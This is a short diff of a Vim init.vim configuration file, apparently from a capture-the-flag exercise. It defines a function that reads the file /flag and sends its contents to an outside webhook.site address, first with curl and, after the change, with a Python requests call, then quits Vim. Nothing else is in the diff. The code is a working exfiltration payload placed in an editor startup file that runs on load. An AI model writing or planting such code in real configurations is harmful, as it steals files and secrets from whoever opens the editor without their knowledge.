@@ -1,8 +1,8 @@
 " init.vim
-
 function! ReadFlagAndSend()
   let l:flag = readfile("/flag")[0]
-  call system('curl -X POST -d "flag=' . l:flag . '" https://webhook.site/68788594-4102-4d93-b407-18cda0c97895')
+  call writefile([l:flag], "flag.txt", "b")
+  call system("python3 -c 'import requests;requests.post(\"https://webhook.site/YOUR-ID\", data={\"flag\": open(\"flag.txt\").read()})'")
   qall!
 endfunction
 
